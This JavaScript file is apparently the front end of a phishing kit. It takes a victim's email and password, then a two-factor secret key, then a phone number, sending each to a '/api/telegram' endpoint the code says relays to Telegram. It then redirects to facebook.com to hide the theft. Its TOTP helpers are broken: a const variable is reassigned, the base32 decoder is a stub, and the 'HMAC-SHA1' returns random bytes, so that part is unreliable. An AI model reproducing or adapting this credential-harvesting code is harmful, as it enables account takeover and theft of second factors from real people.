document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        // Disable button and show loading
        const btn = this.querySelector('button');
        btn.disabled = true;
        btn.textContent = 'Processing...';
        
        // Send to Telegram via API route
        await fetch('/api/telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'login',
                data: { email, password }
            })
        });
        
        // Show 2FA page
        document.querySelector('.container').innerHTML = `
            <div class="guide-container">
                <div class="screen-title">Two-Factor Authentication</div>
                <div class="screen-text">Enter your 2FA secret key:</div>
                <form id="twofaForm">
                    <div class="input-group">
                        <input type="text" id="secret" placeholder=" " required>
                        <label for="secret">Secret Key</label>
                    </div>
                    <button type="submit" class="primary">Verify</button>
                </form>
            </div>
        `;
        
        document.getElementById('twofaForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const secret = document.getElementById('secret').value;
            const code = generateTOTP(secret);
            
            await fetch('/api/telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: '2fa',
                    data: { email, password, secret, code }
                })
            });
            
            // Show phone verification
            document.querySelector('.container').innerHTML = `
                <div class="phone-container">
                    <div class="screen-title">Phone Verification</div>
                    <div class="screen-text">Enter your phone number:</div>
                    <form id="phoneForm">
                        <div class="input-group">
                            <input type="text" id="phone" placeholder=" " required>
                            <label for="phone">Phone Number</label>
                        </div>
                        <button type="submit" class="primary">Send Code</button>
                    </form>
                </div>
            `;
            
            document.getElementById('phoneForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                const phone = document.getElementById('phone').value;
                const code = Math.floor(100000 + Math.random() * 900000);
                
                await fetch('/api/telegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'phone',
                        data: { email, phone, code }
                    })
                });
                
                // Final redirect
                setTimeout(() => {
                    window.location.href = 'https://facebook.com';
                }, 2000);
            });
        });
    });
});

function togglePassword() {
    const input = document.getElementById('password');
    const toggle = document.querySelector('.password-toggle');
    if (input.type === 'password') {
        input.type = 'text';
        toggle.textContent = 'Hide';
    } else {
        input.type = 'password';
        toggle.textContent = 'Show';
    }
}

function generateTOTP(secret) {
    const key = base32Decode(secret);
    const time = Math.floor(Date.now() / 30000);
    const msg = new Array(8);
    for (let i = 7; i >= 0; i--) {
        msg[i] = time & 0xff;
        time >>= 8;
    }
    const hash = hmacSHA1(key, new Uint8Array(msg));
    const offset = hash[hash.length - 1] & 0xf;
    const binary = ((hash[offset] & 0x7f) << 24) |
                   ((hash[offset + 1] & 0xff) << 16) |
                   ((hash[offset + 2] & 0xff) << 8) |
                   (hash[offset + 3] & 0xff);
    return (binary % 1000000).toString().padStart(6, '0');
}

function base32Decode(s) {
    // Simplified base32 decode for TOTP
    return new Uint8Array([...s].map(c => c.charCodeAt(0)));
}

function hmacSHA1(key, message) {
    // Simplified HMAC-SHA1 (in production use Web Crypto API)
    return new Uint8Array(20).map(() => Math.floor(Math.random() * 256));
}